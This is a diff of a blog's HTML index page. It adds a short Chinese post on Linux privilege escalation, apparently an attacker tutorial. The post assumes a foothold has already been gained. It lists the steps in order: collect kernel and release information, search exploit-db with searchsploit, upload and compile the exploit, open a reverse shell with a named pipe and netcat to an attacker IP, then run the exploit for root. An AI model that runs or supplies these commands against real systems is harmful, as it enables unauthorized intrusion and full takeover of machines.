@@ -143,6 +143,101 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Linux-系统提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/11/Linux-系统提权/">Linux 系统提权</a>
+    </h1>
+  
+
+        
+        <a href="/2017/09/11/Linux-系统提权/" class="archive-article-date">
+  	<time datetime="2017-09-11T06:37:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前提：</p>
+<p>已经拿到低权shell</p>
+<p>被入侵的机器上面有nc，python，perl等linux非常常见的工具</p>
+<p>有权限上传文件和下载文件</p>
+<p>内核漏洞提权</p>
+<p>内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集。</p>
+<p>第一步</p>
+<p>查看linux版本信息</p>
+<p>cat /etc/issuecat /etc/*-release</p>
+<p>查看内核版本</p>
+<p>uname -a </p>
+<p>这里我找了台机器测试：</p>
+<p>#uname -aLinux xxxxx 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux#cat /etc/*-releaseDISTRIB_ID=UbuntuDISTRIB_RELEASE=10.04DISTRIB_CODENAME=lucidDISTRIB_DESCRIPTION=”Ubuntu 10.04 LTS”</p>
+<p>这样，我们就得到了系统的内核版本（2.6.32-21 pae），cpu架构（i686），和发行版（ubuntu 10.04）</p>
+<p>可以开始搜索了</p>
+<p>大多内核漏洞通过内核版本能很快查到</p>
+<p>第二步</p>
+<p>用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码</p>
+<p>searchspoit linux 2.6 ubuntu priv esc</p>
+<p>找到需要的.c文件</p>
+<p>第三步</p>
+<p>将.c文件上传到获得shell的机器上</p>
+<p>第四步</p>
+<p>在webshell的机器上编译.c 文件</p>
+<p>gcc hello.c -o hello</p>
+<p>第五步</p>
+<p>使用一个可交互的shell，这里使用的nc反弹</p>
+<p>攻击方执行：nc -lnvp 4430</p>
+<p>被攻击方执行：mknod /tmp/backpipe p</p>
+<pre><code>/bin/sh 0&lt;/tmp/backpipe | nc 192.168.xx.xx 4430 1&gt;/tmp/backpipe
+</code></pre><p>第六步</p>
+<p>执行.c文件，提升权限  ./hello</p>
+<p>id 查看当前权限</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/09/11/Linux-系统提权/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -245,7 +340,7 @@ var _hmt = _hmt || [];
 		toc_hide_index: true,
 		root: "/",
 		innerArchive: true,
-		showTags: false
+		showTags: true
 	}
 </script>
 
